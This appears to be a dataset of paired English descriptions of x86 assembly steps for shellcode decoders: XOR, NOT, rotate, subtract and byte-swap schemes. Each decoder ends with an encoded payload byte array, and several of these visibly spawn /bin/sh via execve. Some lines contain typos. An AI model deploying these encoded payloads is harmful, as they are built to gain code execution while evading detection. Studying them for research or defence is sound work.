define the decoder function _BREAK store the encoded shellcode pointer in the esi register
store the encoded shellcode pointer in the esi register _BREAK zero out the ecx register
zero out the ecx register _BREAK move 25 in the lower 8 bits of the register cl
move 25 in the lower 8 bits of the register cl _BREAK define the decode label
define the decode label _BREAK subtract 8 from the curent byte of the shellcode
subtract 8 from the curent byte of the shellcode _BREAK negate the byte of the shellcode
negate the byte of the shellcode _BREAK point to the next byte in esi
point to the next byte in esi _BREAK decrement the counter and jump to the decode label if is not zero
decrement the counter and jump to the decode label if is not zero _BREAK jump short to the EncodedShellcode label
jump short to the EncodedShellcode label _BREAK define the call_shellcode label
define the call_shellcode label _BREAK call the decoder function
call the decoder function _BREAK define the array of bytes EncodedShellcode and initialize it to 0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94,0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87
define the decoder function _BREAK load the address of esi into edi
load the address of esi into edi _BREAK clear the eax
clear the eax _BREAK clear the ebx
clear the ebx _BREAK define the switch function
define the switch function _BREAK move the byte at the address esi + eax into bl
move the byte at the address esi + eax into bl _BREAK compare bl and 0xaa
compare bl and 0xaa _BREAK jump to xordecode if bl is zero
jump to xordecode if bl is zero _BREAK compare bl and 0xbb
compare bl and 0xbb _BREAK if bl is zero jump to xordecode
if bl is zero jump to xordecode _BREAK jump notdecode
jump notdecode _BREAK define xordecode
define xordecode _BREAK move the byte at the address esi + eax +1 into bl
move the byte at the address esi + eax +1 into bl _BREAK move bl into the byte in edi
move bl into the byte in edi _BREAK perform xor operation between the byte in edi with 0xDD
perform xor operation between the byte in edi with 0xDD _BREAK point to the next byte in edi
point to the next byte in edi _BREAK add 3 to al
add 3 to al _BREAK jump short to switch
jump short to switch _BREAK notdecode function
notdecode function _BREAK move the byte at the address esi + eax +1 into bl
move the byte at the address esi + eax +1 into bl _BREAK move bl into the byte in edi
move bl into the byte in edi _BREAK negate the byte in edi
negate the byte in edi _BREAK increment edi
increment edi _BREAK add 3 to al
add 3 to al _BREAK jump short to switch
jump short to switch _BREAK define call_decoder
define call_decoder _BREAK call the decoder function
call the decoder function _BREAK shellcode is array of bytes 0xbb,0xec,0x73,0xcc,0x3f,0x9d,0xbb,0x8d,0x51,0xbb,0xb5,0x1b,0xbb,0xb3,0x22,0xbb,0xf2,0x79,0xbb,0xae,0x8e,0xbb,0xb5,0x61,0xbb,0xb5,0x3d,0xbb,0xf2,0x6e,0xbb,0xf2,0x9f,0xbb,0xbf,0x10,0xbb,0xb4,0x89,0xcc,0x76,0x2d,0xcc,0x1c,0x2f,0xbb,0x8d,0x91,0xcc,0x76,0x7e,0xcc,0x1d,0x92,0xbb,0x8e,0x80,0xcc,0x76,0x7b,0xcc,0x1e,0xa7,0xcc,0x4f,0x7f,0xbb,0xd6,0x2b,0xcc,0x32,0x24,0xcc,0x7f,0x37,0xaa
clear ecx _BREAK point edx to the stack pointer
point edx to the stack pointer _BREAK move 13 to cl
move 13 to cl _BREAK function decode
function decode _BREAK get the byte from esi and save it in bl
get the byte from esi and save it in bl _BREAK decrease ebx by 1
decrease ebx by 1 _BREAK move bl into the byte in edx + eax
move bl into the byte in edx + eax _BREAK point to the next byte in eax
oint to the next byte in eax _BREAK get the byte from edi and save it in bl
get the byte from edi and save it in bl _BREAK decrease ebx by 1
decrease ebx by 1 _BREAK move bl into the byte at the address edx + eax
move bl into the byte at the address edx + eax _BREAK point to the next byte in eax
point to the next byte in eax _BREAK point to the next byte in esi
point to the next byte in esi _BREAK point to the next byte in edi
point to the next byte in edi _BREAK decrement the counter and jump to decode if not zero
decrement the counter and jump to decode if not zero _BREAK jump to edx
jump to edx _BREAK define the call_shellcode function
define the call_shellcode function _BREAK call decoder
call decoder _BREAK define the array of bytes EncodedShellcode and initialize to 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce
load the address of esi+0x1 into edi _BREAK clear the eax register
clear the eax register _BREAK move 0x1 in the lowest byte of the register al
move 0x1 in the lowest byte of the register al _BREAK zero out the ebx register
zero out the ebx register _BREAK decode function
decode function _BREAK move the byte at the address esi+eax*1 into bl
move the byte at the address esi+eax*1 into bl _BREAK perform xor between bl and 0xaa 
perform xor between bl and 0xaa  _BREAK jump to EncodedShellcode if bl  is not zero
jump to EncodedShellcode if the result of xor between bl and 0xaa is not zero _BREAK move the byte at the address esi+eax*1 into bl 
move the byte at the address esi+eax*1 into bl  _BREAK move bl into the byte in edi
move bl into the byte in edi _BREAK point to the next byte in edi
point to the next byte in edi _BREAK add 0x2 to al
add 0x2 to al _BREAK jump to decode
jump to decode _BREAK define call_decoder 
define call_decoder _BREAK call decoder function
call decoder function _BREAK define the array of bytes EncodedShellcode and initialize to \xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xaa\x75\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xed\xe8\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\xbb\xbb
zero out the ecx register _BREAK move 0x19 into the cl
move 0x19 into the cl _BREAK define the decoder function
define the decoder function _BREAK perform the xor operation between the byte in esi and the 0xaa value
perform the xor operation between the byte in esi and the 0xaa value _BREAK point to the next byte in esi
point to the next byte in esi _BREAK decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero
decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero _BREAK jump short to the Shellcode label
jump short to the Shellcode label _BREAK define the call_decoder label
define the call_decoder label _BREAK call the decoder function
call the decoder function _BREAK define the array of bytes Shellcode and initialize it to 0xeb,0x0d,0x5e,0x31,0xc9,0xb1,0x19,0x80,0x36,0xaa,0x46,0xe2,0xfa,0xeb,0x05,0xe8,0xee,0xff,0xff,0xff,0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
global _start
global _start _BREAK section text
section text _BREAK define the start label
define the start label _BREAK jump to the call_decoder
jump to the call_decoder _BREAK define the decoder function
define the decoder function _BREAK store the encoded shellcode pointer in the esi register
store the encoded shellcode pointer in the esi register _BREAK zero out the ecx register
zero out the ecx register _BREAK move 0x19 into cl
move 0x19 into cl _BREAK define the decoder function
define the decoder function _BREAK negate the byte in esi
negate the byte in esi _BREAK point to the next byte in esi
point to the next byte in esi _BREAK decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero
decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero _BREAK jump short to the EncodedShellcode label
jump short to the EncodedShellcode label _BREAK define the call_decoder label
define the call_decoder label _BREAK call the decoder function
call the decoder function _BREAK define the array of bytes EncodedShellcode and initialize it to 0xeb,0x0c,0x5e,0x31,0xc9,0xb1,0x19,0xf6,0x16,0x46,0xe2,0xfb,0xeb,0x05,0xe8,0xef,0xff,0xff,0xff,0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f
move it into cx _BREAK point to the next word in esi
point to the next word in esi _BREAK point to the next word in esi
point to the next word in esi _BREAK move esi into bx
move esi into bx _BREAK point to the next word in esi
point to the next word in esi _BREAK point to the next word in esi
point to the next word in esi _BREAK push the stack onto esi 
push the stack onto esi _BREAK move the contents on edi
move the contents on edi _BREAK main function
main function _BREAK move esi into ax
move esi into ax _BREAK perform xor between ax and bx
perform xor between ax and bx _BREAK jump to call decoded if ax is zero
jump to call decoded if ax is zero _BREAK shift right ax by the contents of cl
shift right ax by the contents of cl _BREAK negate the word in ax
negate the word in ax _BREAK move al into edi
move al into edi _BREAK point to the next word in esi
point to the next word in esi _BREAK point to the next word in esi
point to the next word in esi _BREAK point to the next byte in edi
point to the next byte in edi _BREAK jump short to main
jump short to main _BREAK define call_decoded
define call_decoded _BREAK execute call_decoded
execute call_decoded _BREAK define enc function
define enc function _BREAK call decoder
call decoder _BREAK define encoded as array of words 0x04, 0x539, 0x9d9, 0x6c9, 0xfc9, 0xc49, 0xc29, 0x839, 0xdf9, 0xc49, 0xc49, 0x839, 0x839, 0xce9, 0xc59, 0x259, 0x4f9, 0xfc9, 0x259, 0x4e9, 0xff9, 0x259, 0x4d9, 0x1c9, 0xa79, 0x619, 0x2c9, 0x539
define the start label _BREAK jump short to call_decoder
jump short to call_decoder _BREAK decoder routine
decoder routine _BREAK store encoded_shellcode pointer in ESI
store encoded_shellcode pointer in ESI _BREAK push encoded_shellcode pointer to stack for later execution
push encoded_shellcode pointer to stack for later execution _BREAK move encoded_shellcode pointer to EDI
move encoded_shellcode pointer to EDI _BREAK decode routine
decode routine _BREAK move current word from encoded_shellcode to AX
move current word from encoded_shellcode to AX _BREAK XOR encoded_shellcode with 1337, one word at a time
XOR encoded_shellcode with 1337, one word at a time _BREAK if ax is zero jump to decoded_shellcode
if ax is zero jump to decoded_shellcode _BREAK shift encoded_shellcode to right by one bit, one word at a time
shift encoded_shellcode to right by one bit, one word at a time _BREAK substract 13 from encoded_shellcode, one word at a time
substract 13 from encoded_shellcode, one word at a time _BREAK move decoded byte to EDI
move decoded byte to EDI _BREAK point to the next encoded_shellcode word
point to the next encoded_shellcode word _BREAK point to the next encoded_shellcode word
point to the next encoded_shellcode word _BREAK point to the next decoded_shellcode byte
point to the next decoded_shellcode byte _BREAK jump to decode and repeat the decoding process for the next word
jump to decode and repeat the decoding process for the next word _BREAK define decoded_shellcode function
define decoded_shellcode function _BREAK call decoded_shellcode function
call decoded_shellcode function _BREAK define call_decoder
define call_decoder _BREAK call decoder
call decoder _BREAK define encoded_shellcode as array of words 0x545, 0x4a3, 0x583, 0x5d3, 0x541, 0x541, 0x439, 0x5d3, 0x5d3, 0x541, 0x5e7, 0x5d5, 0x5cf, 0x411, 0x4eb, 0x443, 0x509, 0x48d, 0x423, 0x539
zero out the loop counter _BREAK move shellcode_length in the first byte
move shellcode_length in the first byte _BREAK define check_even_odd
define check_even_odd _BREAK jump to even_number
jump to even_number _BREAK define odd_number
define odd_number _BREAK left rotate the shellcode by one
left rotate the shellcode by one _BREAK jump short to inc_dec
jump short to inc_dec _BREAK define even_number
define even_number _BREAK right rotate the shellcode in esi by one
 right rotate the shellcode in esi by one _BREAK define inc_dec
define inc_dec _BREAK next byte in the encoded shellcode
next byte in the encoded shellcode _BREAK decrease the counter and jump to check_even_odd if not zero
decrease the counter and jump to check_even_odd if not zero _BREAK jump short to shellcode
jump short to shellcode _BREAK define call_shellcode
define call_shellcode _BREAK call decoder function
call decoder function _BREAK define shellcode as array of bytes 0x62,0x60,0xa0,0x34,0x5e,0x97,0xe6,0x34,0xd0,0x97,0xc4,0xb4,0xdc,0xc4,0xc7,0x28,0x13,0x71,0xa6,0xc4,0xc3,0x58,0x16,0xe6,0x01
shellcode address in esi _BREAK shellcode length in al
shellcode length in al _BREAK clear ecx register
clear ecx register _BREAK decode function
decode function _BREAK move the byte at the addrss in esi+ecx+1 in bl
move the byte at the addrss in esi+ecx+1 in bl _BREAK subtract 0x7 from bl
subtract 0x7 from bl _BREAK move bl into the byte in esi+ecx
move bl into the byte in esi+ecx _BREAK point to the next position in ecx
point to the next position in ecx _BREAK compare al with cl
compare al with cl _BREAK if al is not zero jump short to decode
if al is not zero jump short to decode _BREAK jump to shellcode
jump to shellcode _BREAK define stage
define stage _BREAK call decoder function
call decoder function _BREAK define shellcode as array of bytes 0x18,0x38,0xc7,0x57,0x6f,0x36,0x36,0x7a,0x6f,0x6f,0x36,0x69,0x70,0x75,0x90,0xea,0x38,0xd0,0x90,0xd1,0x71,0x12,0x5f,0xd4,0x87
clear the counter _BREAK move 0x1e into cl
move 0x1e into cl _BREAK define decode function
define decode function _BREAK compare the byte in esi with 0x7
compare the byte in esi with 0x7 _BREAK if the byte in esi is lower then 0x7 jump to lowbound
 if the byte in esi is lower then 0x7 jump to lowbound _BREAK subtract 0x7 from the byte in esi
subtract 0x7 from the byte in esi _BREAK jump to common_commands
jump to common_commands _BREAK lowbound label 
lowbound label _BREAK clear the ebx
clear the ebx _BREAK clear the edx
clear the edx _BREAK move 0x7 to bl
move 0x7 to bl _BREAK move 0xff to dl
move 0xff to dl _BREAK increment dx by one
increment dx by one _BREAK subtract the current byte of the shellcode from bl
subtract the current byte of the shellcode from bl _BREAK subtract bx from dx
subtract bx from dx _BREAK move dl into the byte in esi
move dl into the byte in esi _BREAK define common_commands
define common_commands _BREAK point to the next byte in esi
point to the next byte in esi _BREAK decrement the counter and jump to decode routine if it is not zero
decrement the counter and jump to decode routine if it is not zero _BREAK jump to Shellcode label
jump to Shellcode label _BREAK define the function call_decoder
define the function call_decoder _BREAK in the function call_decoder call the decoder routine
in the function call_decoder call the decoder routine _BREAK define Shellcode as array of bytes 0xeb,0x25,0x5e,0x31,0xc9,0xb1,0x1e,0x80,0x3e,0x07,0x7c,0x05,0x80,0x2e,0x07,0xeb,0x11,0x31,0xdb,0x31,0xd2,0xb3,0x07,0xb2,0xff,0x66,0x42,0x2a,0x1e,0x66,0x29,0xda,0x88,0x16,0x46,0xe2,0xe2,0xeb,0x05,0xe8,0xd6,0xff,0xff,0xff,0x38,0xc7,0x57,0x6f,0x69,0x68,0x7a,0x6f,0x6f,0x69,0x70,0x75,0x36,0x6f,0x36,0x36,0x36,0x36,0x90,0xea,0x57,0x90,0xe9,0x5a,0x90,0xe8,0xb7,0x12,0xd4,0x89
save the shellcode in esi _BREAK move esi to edi
move esi to edi _BREAK define decode function
define decode function _BREAK move the current byte of the shellcode in the bl register
move the current byte of the shellcode in the bl register _BREAK perform the xor between bl and 0xBB
perform the xor between bl and 0xBB _BREAK jump to formatting if bl is zero
jump to formatting if bl is zero _BREAK move the byte of the shellcode in cl
move the byte of the shellcode in cl _BREAK perform xor between cl and 0xAA
perform xor between cl and 0xAA _BREAK jump to shift decode if the cl is zero
jump to shift decode if the cl is zero _BREAK point to the next byte of the shellcode
point to the next byte of the shellcode _BREAK jump short to decode
jump short to decode _BREAK define shift_decode routine
define shift_decode routine _BREAK move the byte in esi+1 to dl
move the byte in esi+1 to dl _BREAK shift right dl by 1
shift right dl by 1 _BREAK move dl into the byte in esi+1
move dl into the byte in esi+1 _BREAK point to the next byte of the shellcode
point to the next byte of the shellcode _BREAK jump short to decode
jump short to decode _BREAK formatting label
formatting label _BREAK move edi to eax
move edi to eax _BREAK move the byte in eax to bl
move the byte in eax to bl _BREAK perform xor between bl and 0xBB
perform xor between bl and 0xBB _BREAK jump to encoded if bl is zero
jump to encoded if bl is zero _BREAK define format routine
define format routine _BREAK move the byte in eax to bl
move the byte in eax to bl _BREAK move the byte in eax to cl
move the byte in eax to cl _BREAK perform xor between cl and 0xAA
perform xor between cl and 0xAA _BREAK jump to Next_Cycle if cl is not zero
jump to Next_Cycle if cl is not zero _BREAK define Cycle
define Cycle _BREAK move the byte at address eax to dl
move the byte at address eax to dl _BREAK perform xor between dl and 0xBB
perform xor between dl and 0xBB _BREAK jump to Next_Cycle if dl is zero
jump to Next_Cycle if dl is zero _BREAK move the byte at address eax+1 to dl
move the byte at address eax+1 to dl _BREAK move dl at the address eax
move dl at the address eax _BREAK point to the next byte in eax
point to the next byte in eax _BREAK jump short to Cycle
jump short to Cycle _BREAK define the Next_Cycle function
define the Next_Cycle function _BREAK increment edi by one
increment edi by one _BREAK jump short to formatting
 jump short to formatting _BREAK define call_shellcode
define call_shellcode _BREAK call the decoder function
call the decoder function _BREAK encoded is the array of bytes 0xAA,0x62,0xc0,0xAA,0xa0,0xAA,0xd0,0xAA,0x5e,0xAA,0x5e,0xAA,0xe6,0xAA,0xd0,0xAA,0xd0,0xAA,0x5e,0xAA,0xc4,0xAA,0xd2,0xAA,0xdc,0x89,0xe3,0xAA,0xa0,0x89,0xe2,0xAA,0xa6,0x89,0xe1,0xb0,0xAA,0x16,0xcd,0x80,0xBB
zero out ebx _BREAK zero out ecx
zero out ecx _BREAK zero out edx
zero out edx _BREAK move 0x45 to dl
move 0x45 to dl _BREAK jump short to call_decoder
jump short to call_decoder _BREAK decoder routine
decoder routine _BREAK store the shellcode pointer to esi
store the shellcode pointer to esi _BREAK point edi to the start of the shellcode
point edi to the start of the shellcode _BREAK decode function
decode function _BREAK move the byte at the address edi+ecx into bl
move the byte at the address edi+ecx into bl _BREAK move bl to bh
move bl to bh _BREAK move dl to al
move dl to al _BREAK perform xor between al and bl
perform xor between al and bl _BREAK jump short to shellcode if al is zero
jump short to shellcode if al is zero _BREAK mov the word at the address edi+1+ecx into ax
mov the word at the address edi+1+ecx into ax _BREAK perform xor between ax and bx
perform xor between ax and bx _BREAK move ax into the word in edi
move ax into the word in edi _BREAK point to the next byte in ecx
point to the next byte in ecx _BREAK load the address of edi+2 into edi
load the address of edi+2 into edi _BREAK jump short to decode
jump short to decode _BREAK call_decoder label
call_decoder label _BREAK call decoder
call decoder _BREAK shellcode contains the bytes 0x31,0xc0,0x31,0xdb,0x31,0xc9,0x31,0xd2,0xb2,0xa4,0xeb,0x1f,0x5e,0x8d,0x3e,0x8a,0x1c,0x0f,0x88,0xdf,0x88,0xd0,0x30,0xd8,0x74,0x16,0x66,0x8b,0x44,0x0f,0x01,0x66,0x31,0xd8,0x66,0x89,0x07,0x41,0x8d,0x7f,0x02,0xeb,0xe4,0xe8,0xdc,0xff,0xff,0xff,0x7d,0x4c,0xa6,0x09,0xfe,0xea,0xd8,0x8b,0x9b,0x0c,0x5f,0x66,0x30,0x32,0xb9,0x07,0xe6,0xb7,0x0f,0x69,0xc2,0xab,0x2b,0xf0,0x3e,0x60,0x6c,0xea,0x82,0xe8,0x63,0x63,0x72,0x68,0x34,0x02,0xeb,0xfb,0xba,0xef,0xbf,0x66,0xf4,0x15,0x9e,0xbb,0xdd,0xe3,0x73,0xbe,0xf3,0xbb,0x32,0xfa,0xeb,0xef,0x58,0x20,0x24,0x90,0xe3,0x85,0x2e,0x64,0xe4,0x27,0x59,0xe9,0x3f,0xee,0x23,0x6e,0x63,0xf0,0x3a,0x47,0x2d,0x78,0x68,0x30,0xa5,0x66,0xe6,0x2f,0x69,0x10,0x91,0xfa,0x92,0xd5,0x3e,0x11,0x4d,0xf4,0x9c,0x9c,0x16,0x39,0x74,0xa0,0xc9,0xce,0xd2,0x5b,0x31,0x5c,0x0c,0x0f,0xfb,0x72,0x1a,0xb6,0x06,0xbd,0xd1,0x1c,0x51,0xa4
load address of our encoded shellcode (encoded_shellcode) into ESI _BREAK trick to clear eax and exc
trick to clear eax and exc _BREAK move 10 into the first byte of the counter
move 10 into the first byte of the counter _BREAK decode_loop
decode_loop _BREAK load encoded_shellcode's byte pointed by ESI in al
load encoded_shellcode's byte pointed by ESI in al _BREAK swap al value with next byte value (ESI+1)
swap al value with next byte value (ESI+1) _BREAK move al into the value at the address esi
move al into the value at the address esi _BREAK add 2 to the contents of esi
add 2 to the contents of esi _BREAK decrement the counter and if it is not zero go back at decode_loop and execute the cicle again
decrement the counter and if it is not zero go back at decode_loop and execute the cicle again _BREAK jump to encoded_shellcode
jump to encoded_shellcode _BREAK define shellcode_section
define shellcode_section _BREAK go to decoder's main
go to decoder's main _BREAK enocoded_shellcode is an array of bytes 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80
zero out edx _BREAK get the address of shellcode
get the address of shellcode _BREAK move 0xaaaa9090 to edi
move 0xaaaa9090 to edi _BREAK subtract 0x7f from the stack
subtract 0x7f from the stack _BREAK subtract 0x7f from the stack
subtract 0x7f from the stack _BREAK subtract 0x7f from esp
subtract 0x7f from esp _BREAK subtract 0x7f from esp
subtract 0x7f from esp _BREAK decode routine
decode routine _BREAK save the byte in esi+edx+1 in bl
save the byte in esi+edx+1 in bl _BREAK save the byte in esi+edx+2 in bh
save the byte in esi+edx+2 in bh _BREAK save the byte in esi+edx+3 in cl
save the byte in esi+edx+3 in cl _BREAK save the byte in esi+edx+4 in ch
save the byte in esi+edx+4 in ch _BREAK perform the xor between bl and the byte in esi+edx
perform the xor between bl and the byte in esi+edx _BREAK perform the xor between bh and the byte in esi+edx
perform the xor between bh and the byte in esi+edx _BREAK perform the xor between cl and the byte in esi+edx
perform the xor between cl and the byte in esi+edx _BREAK perform the xor between ch and the byte in esi+edx
perform the xor between ch and the byte in esi+edx _BREAK move ch into the byte in esp+eax
move ch into the byte in esp+eax _BREAK move cl into the byte in esp+eax+1
move cl into the byte in esp+eax+1 _BREAK move bh into the byte in esp+eax+2
move bh into the byte in esp+eax+2 _BREAK move bl into the byte in esp+eax+3
move bl into the byte in esp+eax+3 _BREAK compare doubleword in esi+edx+5 with edi
compare doubleword in esi+edx+5 with edi _BREAK if doubleword in esi+edx+5 is zero jump to execute_shellcode
 if doubleword in esi+edx+5 is zero jump to execute_shellcode _BREAK increment edx 
increment edx _BREAK increment edx
increment edx _BREAK increment edx
increment edx _BREAK increment edx
increment edx _BREAK increment edx
increment edx  _BREAK add 4 to eax
add 4 to eax _BREAK jump to decode if eax is not zero
jump to decode if eax is not zero _BREAK define execute_shelloce
define execute_shelloce _BREAK jump short to esp
jump short to esp_ BREAK define call_shellcode
define call_shellcode _BREAK execute the decoder routine
execute the decoder routine _BREAK encoder_shellcode is the array of bytes 0x08,0x60,0x58,0xc8,0x39,0xb0,0xd8,0xc3,0x9f,0x9f,0xd1,0xb8,0xb3,0xfe,0xb9,0x1e,0x4e,0xfd,0x97,0x70,0x39,0xb0,0x6a,0xdb,0xb0,0xc4,0x09,0xcf,0x74,0x25,0x76,0xe6,0xe6,0xe6,0xf6,0x90,0x90,0xaa,0xaa
decode function _BREAK compare current esi byte with 0x88
compare current esi byte with 0x88 _BREAK jump to shellcode label if byte in esi is zero
jump to shellcode label if byte in esi is zero _BREAK NOT operation of current byte in esi
NOT operation of current byte in esi _BREAK ADD 0x02 to the current byte in esi
ADD 0x02 to the current byte in esi _BREAK XOR between current byte in esi and 0x97